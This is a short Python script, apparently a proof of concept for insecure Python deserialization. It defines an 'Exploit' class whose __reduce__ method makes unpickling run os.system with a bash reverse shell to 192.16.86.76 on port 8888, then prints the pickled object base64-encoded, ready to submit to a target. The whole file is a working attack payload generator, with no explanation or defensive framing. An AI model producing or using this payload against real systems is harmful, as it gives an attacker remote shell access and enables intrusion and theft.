from base64 import b64encode
import pickle


class Exploit(object):
    def __reduce__(self):
        import os
        return os.system, (b"bash -i >& /dev/tcp/192.16.86.76/8888 0>&1", )


def just_serialize():
    my_data = Exploit()
    my_data_pickled = pickle.dumps(my_data)
    my_data_pickled = b64encode(my_data_pickled).decode("utf-8")
    print(my_data_pickled)


if __name__ == '__main__':
    just_serialize()
